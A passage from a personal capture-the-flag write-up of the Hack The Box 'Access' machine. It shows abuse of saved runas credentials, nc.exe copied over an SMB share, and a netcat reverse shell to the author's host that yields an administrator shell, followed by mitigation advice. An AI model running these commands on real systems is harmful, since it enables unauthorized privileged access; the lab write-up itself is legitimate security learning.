L?F?@ ??7???7???#?P/P?O? ?:i?+00?/C:\R1M?:Windows???:?▒M?:*wWindowsV1MV?System32???:?▒MV?*?System32▒X2P?:?
                                                                                                           runas.exe???:1??:1?*Yrunas.exe▒L-K??E?C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico?%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico?%?
                                                   ?wN?▒?]N?D.??Q???`?Xaccess?_???8{E?3
                                                                                       O?j)?H???
                                                                                                )??[?_???8{E?3
                                                                                                              O?j)?H???
                                                                                                                       )??[?    ??1SPS??XF?L8C???&?m?e*S-1-5-21-953262931-566350628-63446256-500
PS C:\Users\Public\Desktop> 

```

I google ZKAccess and find it's an access control software. 

We can see it includes stuff like "Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe""

So it seems like runas.exe is ran as administrator. And the creds are saved by ZKAccess?

So we could maybe run the same code with an executable behind it.

So since port 445 is open, we can host a smb server and download a file that way. I'm just gonna do netcat, and when we run it like this we should get an admin reverse shell.

```
kali@kali:~/htb/Access$ locate nc.exe
/home/kali/Downloads/nc.exe
/home/kali/htb/Arctic/nc.exe
/home/kali/htb/Bounty/nc.exe
/home/kali/htb/Granny/nc.exe
/home/kali/remote/nc.exe
/opt/SecLists/Web-Shells/FuzzDB/nc.exe
/opt/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe
kali@kali:~/htb/Access$ cp /usr/share/windows-resources/binaries/nc.exe .
kali@kali:~/htb/Access$ sudo impacket-smbserver smb .
[sudo] password for kali: 
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

I look for a place to upload:

```
PS C:\Users\Public\Desktop> cd ..
PS C:\Users\Public> mkdir test


    Directory: C:\Users\Public


Mode                LastWriteTime     Length Name                                                                               
----                -------------     ------ ----                                                                               
d----          2/2/2021   7:02 PM            test                                                                               


PS C:\Users\Public> dir


    Directory: C:\Users\Public


Mode                LastWriteTime     Length Name                                                                               
----                -------------     ------ ----                                                                               
d-r--         7/14/2009   6:06 AM            Documents                                                                          
d-r--         7/14/2009   5:57 AM            Downloads                                                                          
d-r--         7/14/2009   5:57 AM            Music                                                                              
d-r--         7/14/2009   5:57 AM            Pictures                                                                           
d----          2/2/2021   7:02 PM            test                                                                               
d-r--         7/14/2009   5:57 AM            Videos                                                                             


PS C:\Users\Public> cd test
PS C:\Users\Public\test> cp \\10.10.14.70\smb\nc.exe nc.exe
PS C:\Users\Public\test> dir


    Directory: C:\Users\Public\test


Mode                LastWriteTime     Length Name                                                                               
----                -------------     ------ ----                                                                               
-a---          2/2/2021   7:00 PM      59392 nc.exe                                                                             


PS C:\Users\Public\test> 
```

So we got netcat uploaded.

```
PS C:\Users\Public\test> C:\Windows\System32\runas.exe C:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "nc.exe -e cmd 10.10.14.70 1338"
PS C:\Users\Public\test> C:\Windows\System32\runas.exe user:ACCESS\Administrator /savecred "nc.exe -e cmd 10.10.14.70 1338"
PS C:\Users\Public\test> C:\Windows\System32\runas.exe user:Administrator /savecred "nc.exe -e cmd 10.10.14.70 1338"
PS C:\Users\Public\test> runas.exe user:Administrator /savecred "nc.exe -e cmd 10.10.14.70 1338"
PS C:\Users\Public\test> C:\Windows\System32\runas.exe /user:Administrator /savecred "nc.exe -e cmd 10.10.14.70 1338"
PS C:\Users\Public\test> 
```

I tried a couple of versions, and finally found one that worked. On our listener:

```
kali@kali:~/htb/Access$ sudo rlwrap nc -nlvp 1338
Listening on 0.0.0.0 1338
Connection received on 10.129.77.17 49163
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
access\administrator

C:\Windows\system32>
```

I also confirmed that the ASPNET directory was "aspnet_client"

```
C:\inetpub\wwwroot>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\inetpub\wwwroot

08/24/2018  07:39 PM    <DIR>          .
08/24/2018  07:39 PM    <DIR>          ..
08/21/2018  10:30 PM    <DIR>          aspnet_client
08/23/2018  11:33 PM               391 index.html
08/24/2018  07:39 PM            88,712 out.jpg
               2 File(s)         89,103 bytes
               3 Dir(s)  16,744,161,280 bytes free

```

## Comparing myself with the official writeup:

the official writeup uses binary transfer to transfer the two files from the ftp server.

they discovered the creds in the zip file and logged onto telnet.

They use the command "cmdkey /list" which reveals a stored credential for the administrator.

they discover that runas uses a stored admin cred with the /savecred switch. 

After getting the root with powershell they explain how to get credentials and masterkeys with DPAPI and mimikatz.


## How to stop this exploit:

Anonymous FTP access should be turned off. Read more here https://docs.microsoft.com/en-us/iis/configuration/system.applicationhost/sites/site/ftpserver/security/authentication/anonymousauthentication 

While the public\Desktop folder is hidden, it should probably just be unaccessible for normal users. The runas with stored credentials seems extremely unsafe. As runas.exe can be ran with any executable.
